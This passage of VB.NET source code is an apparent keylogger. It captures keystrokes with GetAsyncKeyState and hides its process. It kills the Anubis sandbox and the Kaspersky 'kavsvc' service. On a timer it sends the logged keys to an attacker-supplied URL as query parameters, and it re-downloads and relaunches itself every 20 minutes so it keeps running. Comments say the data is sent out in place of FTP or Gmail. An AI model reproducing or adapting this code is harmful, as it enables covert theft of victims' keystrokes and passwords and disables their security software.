        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F3)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F3}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F4)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F4}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F5)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F5}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F6)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F6}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F7)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F7}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F8)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F8}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F9)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F9}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F10)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F10}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F11)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F11}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.F12)
        If Shift = 0 And (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{F12}"
        End If

        If Shift <> 0 And (keystate And &H1S) = &H1S Then
            Me.Visible = True
            Call RegisterServiceProcess(0, 0)
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumLock)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{NumLock}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Scroll)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{ScrollLock}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.Print)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{PrintScreen}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.PageUp)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{PageUp}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.PageDown)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{Pagedown}"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad1)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "1"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad2)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "2"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad3)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "3"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad4)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "4"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad5)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "5"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad6)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "6"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad7)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "7"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad8)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "8"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad9)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "9"
        End If

        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.NumPad0)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "0"
        End If
        keystate = GetAsyncKeyState(System.Windows.Forms.Keys.ControlKey)
        If (keystate And &H1S) = &H1S Then
            TextBox1.Text = TextBox1.Text & "{Ctrl}"
        End If
        For Me.a = 0 To Anubis.Length - 1
            Debug.WriteLine(Anubis(a).ProcessName)
            If Strings.UCase(Anubis(a).ProcessName) = Strings.UCase("Anubis") Then
                Anubis(a).Kill()
            End If
        Next
        For Me.p = 0 To perky.Length - 1
            Debug.WriteLine(perky(p).ProcessName)
            If Strings.UCase(perky(p).ProcessName) = Strings.UCase("kavsvc") Then
                perky(p).Kill()
            End If
        Next
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub

    Private Sub Form1_MouseEnter(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.MouseEnter

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
    End Sub

    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        'writes the keylogger data so it can be accessed, screw FTP and Gmail :D
        WebBrowser1.Navigate(TextBox4.Text + "?g=" + TextBox1.Text + "&h=" + TextBox2.Text + "%" + TextBox3.Text)
        '----------------------------------------------------------------------------
        'attempts to redownload the program to the users My Documents folder.
        'and then re-runs it - but if the file already exists it automatically reruns it.
        'does this every 20 minutes to avoid the keylogger being closed
        'once the new process is started, the current one is ended - done to prevent double keys logged.
        Try
            My.Computer.Network.DownloadFile(TextBox5.Text, DesktopPath, False, 15000)
            DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            DesktopPath = DesktopPath & "\" & TextBox6.Text
            System.Diagnostics.Process.Start(DesktopPath)
            Me.Close()
        Catch ex As Exception
            DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            DesktopPath = DesktopPath & "\" & TextBox6.Text
            System.Diagnostics.Process.Start(DesktopPath)
            Me.Close()
        End Try
    End Sub
    Public Shared Sub AddToAutorun()
    End Sub
End Class
